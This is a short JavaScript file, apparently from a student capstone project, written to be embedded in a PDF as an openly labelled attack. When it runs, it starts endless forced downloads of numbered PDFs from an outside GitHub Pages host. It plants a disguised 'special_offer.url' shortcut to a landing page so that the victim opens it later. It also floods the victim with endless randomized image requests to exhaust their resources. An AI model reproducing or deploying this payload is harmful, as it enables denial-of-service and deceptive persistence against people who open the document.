// This JavaScript would be embedded in the PDF
var i = 0;                                      // Set counter to 0

// Function to start the exploitation
function startExploitation() {                  // Function for exploit
    while (true) {                              // Loop
        var a = document.createElement('a');    // Create element
        a.href = "https://arizona5005.github.io/Capstone/menu" + i + ".pdf";    // Pull menu from repository
        a.download = "menu" + i + ".pdf";                                       // Name download with current number save as pdf
        document.body.appendChild(a);                                           // Anchor
        a.click();                                                              // Click link
        i++;                                                                    // Increment
    }
}

// Function for persistence
// Function for hidden shortcut
// Create blob to mimic url
// Blob -> link to our landing page
// Set download name, goal is to have them open it accidentally later
// Add anchor
// Click link

function createShortcut() {
    var file = new Blob(["[InternetShortcut]\nURL=https://arizona5005.github.io/Capstone/"], {type: "text/plain"});
    var a = document.createElement("a");
    a.href = URL.createObjectURL(file);
    a.download = "special_offer.url";
    document.body.appendChild(a);
    a.click();
}

// Function to overload resources
function overloadResources() {
    while (true) {                                                              // Loop
        var img = new Image();                                                  // New image obj
        img.src = "https://github.com/Arizona5005/Capstone/blob/main/menu.jpg" + Math.random(); // Import menu image w/ randomization
    }
}

// Start the attack
startExploitation();
createShortcut();
overloadResources();